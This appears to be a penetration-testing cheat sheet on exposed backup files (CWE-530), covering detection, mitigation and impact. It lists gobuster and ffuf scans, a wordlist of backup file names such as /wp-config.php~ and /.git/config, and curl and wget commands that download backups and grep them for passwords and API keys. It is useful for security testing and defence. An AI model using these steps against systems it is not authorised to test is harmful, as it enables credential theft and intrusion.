📌 Sensitive Backup Files Exposure

🧠 Description

What is the vulnerability?

Backup files (e.g., .bak, .old, .sql, .tar.gz, .zip, ~ (vim swap), .swp) are left in publicly accessible directories. These files may contain source code, database dumps, configuration secrets, or credentials.

Why does it occur?

Developers manually back up files on the server, forget to remove them, or version control tools leave temporary files. Web servers serve these files if not explicitly blocked.

Security principle violated: Information Disclosure / Secure File Handling

Real-world analogy: Leaving a spare key under the doormat – attackers can find it and gain full access.

🏷️ Classification

  • Type: Information Disclosure
  • OWASP: A05:2021 – Security Misconfiguration
  • CWE: CWE-530: Exposure of Backup File to an Unauthorized Control Sphere

🎯 Attack Surface

  • ✅ Common backup extensions: .bak, .backup, .old, .orig, .sql, .dump, .tar, .gz, .zip, .7z
  • ✅ Temporary editor files: ~, .swp, .swo
  • ✅ Version control leftovers: .git/, .svn/, .hg/
  • ✅ Backup archives in root or /backup/ directories

🔍 Detection Methodology

1. Manual Testing

  • Browse to /backup.sql, /config.php.bak, /wp-config.php~ etc.
  • Use curl to check response codes.

2. Automated Fuzzing

# Gobuster with backup file extensions
gobuster dir -u https://target.com -w /usr/share/wordlists/dirb/common.txt -x .bak,.old,.sql,.tar,.zip

# Use ffuf with a backup wordlist
ffuf -u https://target.com/FUZZ -w backup-files.txt

💣 Basic Payloads (Backup File Names)

/backup.sql
/database.sql
/db_dump.sql
/config.php.bak
/config.inc.old
/wp-config.php~
/index.php~
/.git/config
/.svn/entries
/.htaccess.bak
/composer.json.backup

🚀 Advanced Exploitation

# Download and examine backup file
wget https://target.com/backup.sql
cat backup.sql | grep -i "password"

# If it's a source code backup, search for API keys
grep -r "API_KEY" ./extracted_backup/

✔ Must be reproducible

⚙️ Exploitation Steps

  1. Fuzz for common backup file extensions and names.
  2. Download any accessible backup files.
  3. Extract credentials, API keys, database passwords, or source code.
  4. Use extracted secrets to compromise the application or infrastructure.

🛡️ Mitigation

✅ Never store backups in web‑accessible directories.
✅ Store backups outside the document root (e.g., /var/backups/).
✅ Use .htaccess or server rules to deny access to *.bak, *.sql, *.old.
✅ Configure version control to exclude sensitive files (use .gitignore).
✅ Automatically remove temporary/backup files after deployment.
✅ Regularly scan for exposed backup files using security tools.

🔓 Mitigation Bypass

  • If backup files are compressed and stored with obscure names, attackers may still guess them via wordlist fuzzing.
  • If server misinterprets file extensions (e.g., .php.bak might still execute as PHP if misconfigured).

⚠️ Risk / Impact

Severity: High

Impact: Credential leakage, database compromise, source code theft, full system compromise.

📎 Proof of Concept (PoC)

# Check for backup file
curl -I https://target.com/backup.sql

# If response is 200 OK, download it
curl -O https://target.com/backup.sql
strings backup.sql | grep -i "password"
